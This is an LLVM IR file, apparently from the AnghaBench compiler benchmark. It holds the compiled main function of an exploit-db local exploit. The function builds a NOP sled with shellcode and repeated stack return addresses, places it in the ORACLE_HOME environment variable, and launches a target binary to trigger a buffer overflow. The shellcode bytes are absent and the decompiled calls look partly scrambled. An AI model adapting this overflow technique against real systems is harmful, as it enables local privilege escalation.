; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_21044.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_21044.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFFER = common dso_local global i32 0, align 4
@OFFSET = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [24 x i8] c"Can't allocate memory.\0A\00", align 1
@NOP = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32* null, align 8
@.str.1 = private unnamed_addr constant [12 x i8] c"ORACLE_HOME\00", align 1
@BINARY = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [120 x i8], align 16
  %8 = alloca i64*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %13 = load i32, i32* @BUFFER, align 4
  store i32 %13, i32* %10, align 4
  %14 = load i32, i32* @OFFSET, align 4
  store i32 %14, i32* %12, align 4
  %15 = load i32, i32* %10, align 4
  %16 = call i8* @malloc(i32 %15)
  store i8* %16, i8** %5, align 8
  %17 = icmp ne i8* %16, null
  br i1 %17, label %21, label %18

18:                                               ; preds = %2
  %19 = call i32 @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str, i64 0, i64 0))
  %20 = call i32 @exit(i32 0) #3
  unreachable

21:                                               ; preds = %2
  %22 = call i32 (...) @get_sp()
  %23 = load i32, i32* %12, align 4
  %24 = sub nsw i32 %22, %23
  %25 = sext i32 %24 to i64
  store i64 %25, i64* %9, align 8
  %26 = load i8*, i8** %5, align 8
  store i8* %26, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = bitcast i8* %27 to i64*
  store i64* %28, i64** %8, align 8
  store i32 0, i32* %11, align 4
  br label %29

29:                                               ; preds = %37, %21
  %30 = load i32, i32* %11, align 4
  %31 = load i32, i32* %10, align 4
  %32 = icmp slt i32 %30, %31
  br i1 %32, label %33, label %40

33:                                               ; preds = %29
  %34 = load i64, i64* %9, align 8
  %35 = load i64*, i64** %8, align 8
  %36 = getelementptr inbounds i64, i64* %35, i32 1
  store i64* %36, i64** %8, align 8
  store i64 %34, i64* %35, align 8
  br label %37

37:                                               ; preds = %33
  %38 = load i32, i32* %11, align 4
  %39 = add nsw i32 %38, 4
  store i32 %39, i32* %11, align 4
  br label %29

40:                                               ; preds = %29
  %41 = load i8*, i8** %5, align 8
  %42 = load i32, i32* %10, align 4
  %43 = sdiv i32 %42, 2
  %44 = load i32, i32* @NOP, align 4
  %45 = call i32 @memset(i8* %41, i32 %43, i32 %44)
  %46 = load i8*, i8** %5, align 8
  %47 = load i32, i32* %10, align 4
  %48 = sdiv i32 %47, 2
  %49 = load i32*, i32** @shellcode, align 8
  %50 = call i32 @strlen(i32* %49)
  %51 = sdiv i32 %50, 2
  %52 = sub nsw i32 %48, %51
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %46, i64 %53
  store i8* %54, i8** %6, align 8
  store i32 0, i32* %11, align 4
  br label %55

55:                                               ; preds = %69, %40
  %56 = load i32, i32* %11, align 4
  %57 = load i32*, i32** @shellcode, align 8
  %58 = call i32 @strlen(i32* %57)
  %59 = icmp slt i32 %56, %58
  br i1 %59, label %60, label %72

60:                                               ; preds = %55
  %61 = load i32*, i32** @shellcode, align 8
  %62 = load i32, i32* %11, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds i32, i32* %61, i64 %63
  %65 = load i32, i32* %64, align 4
  %66 = trunc i32 %65 to i8
  %67 = load i8*, i8** %6, align 8
  %68 = getelementptr inbounds i8, i8* %67, i32 1
  store i8* %68, i8** %6, align 8
  store i8 %66, i8* %67, align 1
  br label %69

69:                                               ; preds = %60
  %70 = load i32, i32* %11, align 4
  %71 = add nsw i32 %70, 1
  store i32 %71, i32* %11, align 4
  br label %55

72:                                               ; preds = %55
  %73 = load i8*, i8** %5, align 8
  %74 = load i32, i32* %10, align 4
  %75 = sub nsw i32 %74, 1
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i8, i8* %73, i64 %76
  store i8 0, i8* %77, align 1
  %78 = load i8*, i8** %5, align 8
  %79 = call i32 @setenv(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0), i8* %78, i32 1)
  %80 = load i32, i32* @BINARY, align 4
  %81 = call i32 @system(i32 %80)
  ret void
}

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @printf(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @get_sp(...) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @setenv(i8*, i8*, i32) #1

declare dso_local i32 @system(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
